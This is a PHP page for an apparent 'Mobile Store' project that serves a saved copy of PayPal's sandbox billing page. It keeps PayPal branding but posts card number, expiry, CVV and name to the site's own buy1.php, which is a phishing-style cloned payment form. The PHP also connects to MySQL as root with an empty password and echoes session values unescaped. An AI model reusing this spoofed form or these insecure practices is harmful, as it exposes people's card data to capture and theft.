<?php
$con=mysql_connect("localhost","root","");
mysql_select_db("mobile_db",$con);
session_start();
$emailids=$_SESSION["emailid"];
$product=$_SESSION["product"];
$productprice=$_SESSION["productprice"];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<!-- saved from url=(0248)https://www.sandbox.paypal.com/us/cgi-bin/webscr?cmd=_flow&SESSION=KRA-k0GDfhpWSGRsn_3IdVgpZBshxajCb-k6nZnDS_r7mU_rI54-6Kj24-e&dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b5eb2336391e7cbed125f6c5bdaf8a1cd475a5c32af8ad329 -->
<HTML><HEAD><TITLE>Billing Information - PayPal</TITLE>
<META http-equiv=Content-Type content="text/html; charset=UTF-8"><!--
         Script info: script: merchantpaymentweb, cmd: _flow, template: xpt/Merchant/hostedpayments/standard/Billing, date: Feb 23, 2010 06:14:18 PST; country: US, language: en_US, xslt server: 
       web version: 61.0-1208680 branch: UPR_610_007_int
       content version: -
       pexml version: 61.0-1208680
       page XSL: Merchant/default/en_US/hostedpayments/standard/Billing.xsl
       hostname : -pLpoXejfau2vs6jzF5JGxxHGfoGc3sdP9g2cFjXK5A
         rlogid : %2bpLpoXejfau2vs6jzF5JGwqQ3CvlQGoaETX%2bykux2c%2f9cfJqTxfCUGTwgemg7V5jX4b%2fu4%2fFSPk%3d_1270e95afd4
-->
<META http-equiv=description 
content="PayPal lets you send money to anyone with email. PayPal is free for consumers and works seamlessly with your existing credit card and checking account. You can settle debts, borrow cash, divide bills or split expenses with friends all without going to an ATM or looking for your checkbook.">
<META http-equiv=keywords 
content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, cell phones, two-way pagers, Windows CE">
<META http-equiv=X-UA-Compatible content=IE=8><LINK media=screen 
href="paypal_files/xptdev.css" type=text/css rel=stylesheet><LINK 
href="paypal_files/paypal.css" type=text/css rel=stylesheet><LINK 
href="paypal_files/flowWPS.css" type=text/css rel=stylesheet><LINK 
href="paypal_files/CreditCardEntry.css" type=text/css rel=stylesheet><LINK 
href="paypal_files/balloons.css" type=text/css rel=stylesheet><LINK 
href="paypal_files/sandbox.css" type=text/css rel=stylesheet>
<SCRIPT src="paypal_files/global.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/bid.js" type=text/javascript></SCRIPT>

<SCRIPT type=text/javascript>PAYPAL.common.loginflow = 'xpt/Merchant/hostedpayments/standard/Billing';
								YAHOO.util.Event.addListener(window,"load",function(){
									try {
										PAYPAL.common.appendField("billing", "flow_name", PAYPAL.common.loginflow);
							PAYPAL.bp.init("billing","bp_mid");PAYPAL.ks.init("billing","login_password","bp_ks1");PAYPAL.ks.init("billing","password","bp_ks2");PAYPAL.ks.init("billing","retype_password","bp_ks3");
									} catch(err){ echo(err); }
								});
							</SCRIPT>
<LINK 
href="https://www.sandbox.paypal.com/MERCHANTPAYMENTWEB-610-20100225-1/en_US/i/icon/pp_favicon_x.ico" 
rel="shortcut icon">
<SCRIPT src="paypal_files/iconix.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/mid.js" type=text/javascript></SCRIPT>

<SCRIPT type=text/javascript>PAYPAL.tns.loginflow = 'xpt/Merchant/hostedpayments/standard/Billing';PAYPAL.tns.flashLocation = 'https://www.sandbox.paypal.com/en_US/m/mid.swf';</SCRIPT>

<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
<BODY class=xptSandbox id=billing onload=initialize();>
<DIV id=header>
<H1> Mobile Store</H1></DIV>
<HR>

<DIV id=cowp-wrapper>
<DIV id=main>
<FORM id=billingform name=billing 
action="../buy1.php"
method=post><INPUT id=CONTEXT_CGI_VAR type=hidden 
value=wtgSziM4C5x0SI-9CmKcv2vkSeTLK5P_g6HqzC__YTYkcqziFNcB84p79Ja 
name=CONTEXT><INPUT id=myAllTextSubmitID type=hidden 
name=myAllTextSubmitID><INPUT type=hidden value=_flow name=cmd><INPUT 
type=hidden name=id><INPUT type=hidden name=note><INPUT type=hidden value=false 
name=close_external_flow><INPUT type=hidden value=payment_flow 
name=external_close_account_payment_flow><INPUT id=dfltButton type=image 
src="paypal_files/pixel.gif" value=Continue name=continue.x>
<DIV id=shopping-cart>
<DIV id=purchase-detail><INPUT id=item-quantity type=hidden value=1 
name=item-quantity>
<DIV id=cover>
<TABLE id=cart cellSpacing=0 cellPadding=0 align=center border=0>
  <THEAD>
 
 </TFOOT></TABLE></DIV>

<tr>
<td><?php echo $product; ?>

<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td><?php echo $productprice; ?>
<br>
</tr>

<DIV id=totals>
<TABLE id=col_shipping-table style="WIDTH: 100%" cellSpacing=0 cellPadding=0 
align=right border=0>
  <TBODY></TBODY></TABLE></DIV>
<P></P>
<DIV class=clearBoth></DIV></DIV>
<DIV class=toggle><A id=expander title="Click to view purchase details" 
href="https://www.sandbox.paypal.com/us/cgi-bin/webscr?cmd=_flow&amp;SESSION=KRA-k0GDfhpWSGRsn_3IdVgpZBshxajCb-k6nZnDS_r7mU_rI54-6Kj24-e&amp;dispatch=50a222a57771920b6a3d7b606239e4d529b525e0b7e69bf0224adecfb0124e9b5eb2336391e7cbed125f6c5bdaf8a1cd475a5c32af8ad329#">Click 
to view purchase details</A></DIV><SPAN id=titleExpanded>Click to close purchase 
details</SPAN> </DIV></DIV>
<H1><SPAN id=pgHdr>Pay with Credit Card or Debit Card</SPAN><A 
onclick="PAYPAL.core.openWindow(event,{height:500, width: 450});" 
href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=xpt/Merchant/popup/WaxAboutPaypal-outside" 
target=_blank><IMG alt="Payments By PayPal" 
src="paypal_files/pp_secure_213wx37h.gif" border=0></A> </H1>
<DIV id=post-header><A 
onclick="PAYPAL.core.openWindow(event, {width: 640, height: 500})" 
href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=xpt/Merchant/popup/WhatIsPayPal-outside" 
target=_blank>Learn more</A> about PayPal - the safer, easier way to pay.
<DIV id=content>
<DIV>
<H2>Enter your billing information</H2>
<FIELDSET id=billing-entry><LEGEND>Create a PayPal Account</LEGEND>


<FIELDSET class=standardfinancing id=ccdetails><LEGEND>Credit Card 
Details</LEGEND><INPUT id=creditCardEntry type=hidden name=creditCardEntry>
<DIV class=fieldrow id=fieldrowCCNumber><LABEL for=cc_number>Card 
Number:</LABEL><INPUT id=cc_number onblur=getCC(this); onkeyup=getCC(this); 
maxLength=24 onchange=getCC(this);  name=cc_number> 
</DIV><BR>


<DIV class="fieldrow exp-date" id=fieldrowCCExpDate><LABEL 
for=expdate>Expiration Date:</LABEL><INPUT id=expdate_month 
onkeyup="this.style.color = '#000';" onfocus=getCC(this);clearField(this); 
onclick=clearField(this); maxLength=2 value=mm name=expdate_month>/<INPUT 
id=expdate_year onKeyUp="this.style.color = '#000';" onfocus=clearField(this); 
onclick="clearField(this); this.style.color = '#000';" maxLength=4 value=YYYY 
name=expdate_year> </DIV>
<DIV class="fieldrow csc" id=fieldrowCSC><LABEL 
for=cvv2_number>CVV:</LABEL><INPUT id=cvv2_number maxLength=3 size=4  
name=cvv2_number><SPAN class=autoTooltip 
title="For MasterCard or Visa, it's the last three digits in the signature area on the back of your card.  For American Express, it's the four digits on the front of the card.">
<DL class=quick-faq id=csc-def>
  <DT><A id=csc-hover 
  onclick="PAYPAL.core.openWindow(event, {width: 425, height: 450});" 
  href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/acc/cvv_info_pop-outside" 
  target=_blank>What's this?</A></DT></DL></SPAN></DIV></FIELDSET> 
<DIV class=billing-information id=billing-info-form>
<DIV class="fieldrow given-name"><LABEL for=first_name>Name On Card:</LABEL><INPUT 
id=first_name maxLength=32 name=first_name onClick="return first_name_onclick()"> </DIV>
<DIV id=afterform>
<DIV class=buttonrow>

<INPUT class="" id=review type=submit value="Pay Now" name=continue.x><SPAN 
id=agree style="DISPLAY: none"></DIV></DIV> </FORM></DIV>
<DIV id=footerhps>
<P>PayPal. The safer, easier way to pay.</P>
<P>For more information, read our <A id=ua_link 
href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/ua-outside&amp;country.x=US" 
target=_blank>User Agreement</A> and <A id=privacy_policy_link 
href="https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/policy_privacy-outside&amp;country.x=US" 
target=_blank>Privacy Policy</A>.</P>
<SCRIPT type=text/javascript>document.getElementById("ua_link").onclick=function() {openWindow640('https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/ua_pop-outside&popup=1&country.x=US'); return false;};document.getElementById("privacy_policy_link").onclick=function() {openWindow640('https://www.sandbox.paypal.com/us/cgi-bin/merchantpaymentweb?cmd=p/gen/ua/policy_privacy_pop-outside&popup=1&country.x=US'); return false;};</SCRIPT>

<DIV id=footerSandbox>
<DIV id=sandboxFooter>
<DIV class=nav-footer></DIV>
<DIV id=testsite>
</DIV></DIV></DIV></DIV></DIV>
<SCRIPT src="paypal_files/widgets.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/billing.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/hostedpayments.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/orderInfo.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/billingForm.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/creditCardEntry.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/pp_main.js" type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/pageBlockingUnsafeBrowsers.js" 
type=text/javascript></SCRIPT>

<SCRIPT src="paypal_files/pp_naturalsearch.js" type=text/javascript></SCRIPT>

<SCRIPT type=text/javascript>mp_landing();</SCRIPT>

<DIV class="" id=ppwebapi></DIV><!-- SiteCatalyst Code
Copyright 1997-2005 Omniture, Inc.
More info available at http://www.omniture.com -->
<SCRIPT src="paypal_files/pp_jscode_paypalsandboxdev.js" 
type=text/javascript></SCRIPT>

<SCRIPT type=text/javascript>
<!--
/* SiteCatalyst Variables */
s.prop1="xpt/Merchant/hostedpayments/standard/Billing";
s.prop5="48Y345701B0993424";
s.prop7="Unknown";
s.prop8="Unknown";
s.prop9="Unknown";
s.prop10="US";
s.prop20="1267259999";
s.prop21="b6a3275a2bf16";
s.prop22="0";
s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
s.pageName="xpt/Merchant/hostedpayments/standard/Billing::_flow";
s.prop50="en_US";
s.prop18="";
/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
var s_code=s.t();if(s_code)document.write(s_code)//--></SCRIPT>

<SCRIPT type=text/javascript><!--
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')

function first_name_onclick() {

}

//-->
</SCRIPT>
<NOSCRIPT><IMG height=1 alt="" src="" width=1 border=0></NOSCRIPT> <!--/DO NOT REMOVE/--><!-- End SiteCatalyst Code --></BODY></HTML>
